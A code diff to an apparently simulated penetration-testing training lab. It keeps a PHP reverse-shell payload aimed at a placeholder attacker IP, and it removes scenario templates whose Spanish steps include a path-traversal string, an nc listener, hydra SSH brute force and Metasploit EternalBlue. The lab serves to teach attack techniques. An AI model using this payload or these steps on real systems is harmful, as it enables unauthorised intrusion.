@@ -23,13 +23,13 @@ export function createAttackerMachine(networkRange: string, customHostname?: str
   };
 }
 
-interface ScenarioBuilderConfig {
+export interface ScenarioBuilderConfig {
   id: string; name: string; description: string;
   difficulty: 'Easy' | 'Medium' | 'Hard';
   category: 'Web' | 'Network' | 'Crypto' | 'Forensics';
   networkRange: string; attackerFiles?: FileEntry[];
-  targetMachine: Omit<Machine, 'machine_info' | 'id'> & { id: string; machine_info: Omit<MachineInfo, 'ip'>; ports: Port[] };
-  learningSteps: LearningStep[];
+  targetMachine: Omit<Machine, 'machine_info' | 'id' | 'learning_steps'> & { id: string; machine_info: Omit<MachineInfo, 'ip'>; ports: Port[] };
+  learningSteps: Omit<LearningStep, 'id' | 'targetMachineId'>[];
 }
 
 export function buildScenario(config: ScenarioBuilderConfig): Scenario {
@@ -41,7 +41,7 @@ export function buildScenario(config: ScenarioBuilderConfig): Scenario {
     scan_results: { ports: config.targetMachine.ports },
     web_enumeration: config.targetMachine.web_enumeration || { web_server: 'none', cms: 'none', directories: [] },
     discovery_level: 0,
-    learning_steps: config.learningSteps.map((step, idx) => ({ ...step, id: idx + 1 })),
+    learning_steps: config.learningSteps.map((step, idx) => ({ ...step, id: idx + 1, targetMachineId: config.targetMachine.id })),
     files: config.targetMachine.files || [],
   };
   const machines = assignDHCP(config.networkRange, [attacker, target]);
@@ -73,8 +73,8 @@ export function createFile(path: string, content: string, type: 'text' | 'hash' 
   return { path, content, type };
 }
 
-const REVERSE_SHELL_PAYLOAD = {
-  phpSimple: `<?php\n\$ip = "ATTACKER_IP"; \$port = 4444;\n\$sock = fsockopen(\$ip, \$port);\nif(\$sock === false) { echo "No connection"; exit(); }\n\$proc = proc_open('/bin/bash', array(0=>\$sock,1=>\$sock,2=>\$sock), \$pipes);\n?>`,
+export const REVERSE_SHELL_PAYLOAD = {
+  phpSimple: `<?php\n\$ip = "ATTACKER_IP"; \$port = LISTENER_PORT;\n\$sock = fsockopen(\$ip, \$port);\nif(\$sock === false) { echo "No connection"; exit(); }\n\$proc = proc_open('/bin/bash', array(0=>\$sock,1=>\$sock,2=>\$sock), \$pipes);\n?>`,
 };
 
 export interface LinuxFileSystemConfig { username?: string; password?: string; shadowPassword?: string; }
@@ -96,97 +96,3 @@ export function createLinuxFileSystem(config: LinuxFileSystemConfig = {}) {
     createFile('/etc/apache2/apache2.conf', '# ServerAdmin webmaster@localhost\n# DocumentRoot /var/www/html\n# <Directory /var/www/html>\n#   Options Indexes FollowSymLinks\n#   AllowOverride All\n# </Directory>', 'text'),
   ];
 }
-
-export const SCENARIO_TEMPLATES = {
-  wordpress: (config: { id: string; name: string; networkRange: string; wpVersion?: string; flags: { user: string; root: string }; credentials: { user: string; pass: string } }): ScenarioBuilderConfig => ({
-    id: config.id, name: config.name,
-    description: 'Enumeración web, descubrimiento de directorios y compromiso de WordPress.',
-    difficulty: 'Easy', category: 'Web', networkRange: config.networkRange,
-    targetMachine: {
-      id: `lab-${config.id}-wp`, machine_info: { hostname: 'vulnerable-wp-lab', mac: '08:00:27:A1:B2:C3', os: 'Ubuntu 20.04 LTS', status: 'up', type: 'server' },
-      discovery_level: 0, scan_results: { ports: [] }, learning_steps: [],
-      ports: [COMMON_PORTS.ssh('OpenSSH 8.2p1 Ubuntu', config.credentials), COMMON_PORTS.http('Apache httpd 2.4.41'), COMMON_PORTS.mysql('filtered')],
-      web_enumeration: { web_server: 'Apache/2.4.41', cms: `WordPress ${config.wpVersion || '6.0'}`, directories: [
-        { path: '/', status: 200, description: 'Página principal' }, { path: '/wp-admin', status: 200, description: 'Panel de administración' },
-        { path: '/uploads', status: 200, description: 'Directorio de archivos subidos' }, { path: '/backup', status: 403, description: 'Copia de seguridad (Acceso denegado)' },
-      ]},
-      files: [...createLinuxFileSystem({ username: 'admin' }), createFile('/home/admin/user.txt', config.flags.user), createFile('/root/flag.txt', config.flags.root),
-        createFile('/uploads/config.bak', `DB_USER=${config.credentials.user}\nDB_PASS=${config.credentials.pass}`, 'text')],
-    },
-    learningSteps: [
-      { id: 1, task: 'Reconocimiento de red', text: 'Descubrir hosts activos: arp-scan <network/cidr>', targetMachineId: `lab-${config.id}-wp`, discoveryLevel: 1 },
-      { id: 2, task: 'Escaneo de puertos', text: 'Escanear puertos: nmap -sV <target-ip>', targetMachineId: `lab-${config.id}-wp`, discoveryLevel: 2 },
-      { id: 3, task: 'Enumeración Web', text: 'Acceder al sitio web desde el botón de Firefox.', targetMachineId: `lab-${config.id}-wp`, discoveryLevel: 2 },
-      { id: 4, task: 'Descubrimiento de directorios', text: 'Enumerar rutas: gobuster dir -u http://<target-ip> -w rockyou.txt', targetMachineId: `lab-${config.id}-wp`, discoveryLevel: 3 },
-      { id: 5, task: 'Compromiso del servidor', text: 'Buscar credenciales en /uploads y acceder a /wp-admin.', targetMachineId: `lab-${config.id}-wp`, discoveryLevel: 4 },
-    ],
-  }),
-
-  lfiRce: (config: { id: string; name: string; networkRange: string; flags: { root: string } }): ScenarioBuilderConfig => ({
-    id: config.id, name: config.name,
-    description: 'Explota LFI para ejecutar una shell remota (RCE).',
-    difficulty: 'Medium', category: 'Web', networkRange: config.networkRange,
-    attackerFiles: [createFile('/root/payload.php', REVERSE_SHELL_PAYLOAD.phpSimple, 'text')],
-    targetMachine: {
-      id: `lab-${config.id}-lfi`, machine_info: { hostname: 'dev-portal-backup', mac: '08:00:27:D6:E7:F8', os: 'Debian 11 (Bullseye)', status: 'up', type: 'server' },
-      discovery_level: 0, scan_results: { ports: [] }, learning_steps: [],
-      ports: [COMMON_PORTS.http('Apache/2.4.52 (Debian)'), COMMON_PORTS.ssh('OpenSSH 8.4p1 Debian')],
-      web_enumeration: { web_server: 'Apache/2.4.52', cms: 'Custom PHP Portal', directories: [
-        { path: '/', status: 200, description: 'Página principal' }, { path: '/upload.php', status: 200, description: 'Subida de archivos' },
-      ]},
-      files: [...createLinuxFileSystem({ username: 'www-data' }), createFile('/var/www/html/flag.txt', config.flags.root)],
-    },
-    learningSteps: [
-      { id: 1, task: 'Reconocimiento', text: 'Descubrir host: arp-scan <network/cidr>', targetMachineId: `lab-${config.id}-lfi`, discoveryLevel: 1 },
-      { id: 2, task: 'Escaneo', text: 'Escanear servicios: nmap -sV <target-ip>', targetMachineId: `lab-${config.id}-lfi`, discoveryLevel: 2 },
-      { id: 3, task: 'LFI Discovery', text: 'Prueba leer archivos: ?page=../../../../etc/passwd', targetMachineId: `lab-${config.id}-lfi`, discoveryLevel: 3 },
-      { id: 4, task: 'Setup Listener', text: 'Prepara escucha: nc -nlvp 4444', targetMachineId: `lab-${config.id}-lfi`, discoveryLevel: 3 },
-      { id: 5, task: 'Preparar Payload', text: 'Lee payload.php: cat /root/payload.php y sube el contenido en mantenimiento.', targetMachineId: `lab-${config.id}-lfi`, discoveryLevel: 3 },
-      { id: 6, task: 'Remote Code Execution', text: 'Ejecuta: ?page=uploads/payload.php', targetMachineId: `lab-${config.id}-lfi`, discoveryLevel: 4 },
-    ],
-  }),
-
-  sshBrute: (config: { id: string; name: string; networkRange: string; flags: { root: string }; credentials: { user: string; pass: string } }): ScenarioBuilderConfig => ({
-    id: config.id, name: config.name,
-    description: 'Escaneo de red y ataque de fuerza bruta por SSH.',
-    difficulty: 'Easy', category: 'Network', networkRange: config.networkRange,
-    targetMachine: {
-      id: `lab-${config.id}-ssh`, machine_info: { hostname: 'ssh-target-lab', mac: '08:00:27:B2:C3:D4', os: 'Ubuntu 22.04 LTS', status: 'up', type: 'server' },
-      discovery_level: 0, scan_results: { ports: [] }, learning_steps: [],
-      ports: [COMMON_PORTS.ssh('OpenSSH 8.9p1 Ubuntu', config.credentials), { port: 8080, protocol: 'tcp', state: 'open', service: 'http-alt', version: 'nginx/1.18.0' }],
-      web_enumeration: { web_server: 'nginx/1.18.0', cms: 'none', directories: [] },
-      files: [...createLinuxFileSystem({ username: 'root' }), createFile('/root/flag.txt', config.flags.root)],
-    },
-    learningSteps: [
-      { id: 1, task: 'Reconocimiento de red', text: 'Descubrir hosts: arp-scan <network/cidr>', targetMachineId: `lab-${config.id}-ssh`, discoveryLevel: 1 },
-      { id: 2, task: 'Escaneo de puertos', text: 'Identificar servicios: nmap -sV <target-ip>', targetMachineId: `lab-${config.id}-ssh`, discoveryLevel: 2 },
-      { id: 3, task: 'Fuerza bruta SSH', text: 'Obtener credenciales: hydra -l root -P rockyou.txt <target-ip> ssh', targetMachineId: `lab-${config.id}-ssh`, discoveryLevel: 3 },
-      { id: 4, task: 'Acceso por SSH', text: 'Conectarse: ssh root@<target-ip> <password>', targetMachineId: `lab-${config.id}-ssh`, discoveryLevel: 4 },
-    ],
-  }),
-
-  eternalBlue: (config: { id: string; name: string; networkRange: string; flags: { root: string } }): ScenarioBuilderConfig => ({
-    id: config.id, name: config.name,
-    description: 'Explotación EternalBlue en Windows 7 sin parchear mediante Metasploit.',
-    difficulty: 'Medium', category: 'Network', networkRange: config.networkRange,
-    targetMachine: {
-      id: 'win7-target', machine_info: { hostname: 'WIN7-TARGET', mac: '08:00:27:C4:D5:E6', os: 'Windows 7 Professional SP1 x64', status: 'up', type: 'workstation' },
-      discovery_level: 0, scan_results: { ports: [] }, learning_steps: [],
-      ports: [
-        { port: 135, protocol: 'tcp', state: 'open', service: 'msrpc', version: 'Microsoft Windows RPC' },
-        { port: 139, protocol: 'tcp', state: 'open', service: 'netbios-ssn', version: 'Microsoft Windows netbios-ssn' },
-        COMMON_PORTS.smb('Windows 7 Professional 7601 Service Pack 1'),
-        { port: 49152, protocol: 'tcp', state: 'open', service: 'msrpc', version: 'Microsoft Windows RPC' },
-      ],
-      web_enumeration: { web_server: 'none', cms: 'none', directories: [] },
-      files: [createFile('C:\\\\Users\\\\Administrator\\\\Desktop\\\\flag.txt', config.flags.root), createFile('C:\\\\Windows\\\\System32\\\\config\\\\SAM', '[SAM Database — use hashdump]', 'binary')],
-    },
-    learningSteps: [
-      { id: 1, task: 'Reconocimiento de red', text: 'Descubrir hosts: arp-scan <network/cidr>', targetMachineId: 'win7-target', discoveryLevel: 1 },
-      { id: 2, task: 'Escaneo de puertos', text: 'Identificar servicios: nmap -sV <target-ip>', targetMachineId: 'win7-target', discoveryLevel: 2 },
-      { id: 3, task: 'Verificar vulnerabilidad', text: 'msfconsole: use auxiliary/scanner/smb/smb_ms17_010 → set RHOSTS → run', targetMachineId: 'win7-target', discoveryLevel: 2 },
-      { id: 4, task: 'Explotar EternalBlue', text: 'use exploit/windows/smb/ms17_010_eternalblue → set RHOSTS/LHOST → exploit', targetMachineId: 'win7-target', discoveryLevel: 3 },
-      { id: 5, task: 'Verificar acceso SYSTEM', text: 'meterpreter: getuid', targetMachineId: 'win7-target', discoveryLevel: 4 },
-    ],
-  }),
-};
